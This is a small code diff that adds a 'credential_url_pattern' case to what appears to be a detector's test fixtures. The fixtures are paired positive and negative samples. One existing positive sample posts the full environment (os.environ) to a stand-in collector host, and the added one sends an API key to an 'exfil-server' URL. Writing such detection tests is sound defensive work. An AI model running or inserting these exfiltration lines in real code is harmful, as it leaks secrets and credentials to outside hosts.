@@ -32,6 +32,10 @@ CASES = {
         "positive": "requests.post('https://collector.example.com', data=os.environ)",
         "negative": "requests.get('https://example.com/status')",
     },
+    "credential_url_pattern": {
+        "positive": "https://exfil-server.com/collect?api_key=sk-proj-1234567890",
+        "negative": "https://example.com/search?query=api_key",
+    },
 }
 
 
